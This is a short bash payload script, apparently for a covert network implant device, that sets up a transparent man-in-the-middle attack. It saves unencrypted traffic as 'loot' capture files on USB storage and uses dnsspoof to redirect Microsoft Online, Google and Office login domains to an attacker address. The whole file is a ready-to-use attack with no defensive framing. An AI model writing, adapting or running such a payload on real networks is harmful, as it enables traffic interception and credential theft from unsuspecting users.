#!/bin/bash
# ~/hexbox/payloads/squirrel_mitm.sh
# Transparent MITM in B&W mode

NETMODE TRANSPARENT
LED R SLOW

# Mount USB for storage
mount /dev/sda1 /mnt 2>/dev/null

# Run tcpdump capturing only juicy traffic (no encrypted streaming)
tcpdump -i br-lan -w /mnt/loot_$(date +%s).pcap \
  'not port 443 and not port 22' &

# DNS spoof – redirect common login domains to attacker IP
cat > /tmp/hosts.txt <<EOF
10.10.10.10 *.microsoftonline.com
10.10.10.10 *.google.com
10.10.10.10 *.office.com
EOF
dnsspoof -i br-lan -f /tmp/hosts.txt &

LED G SOLID
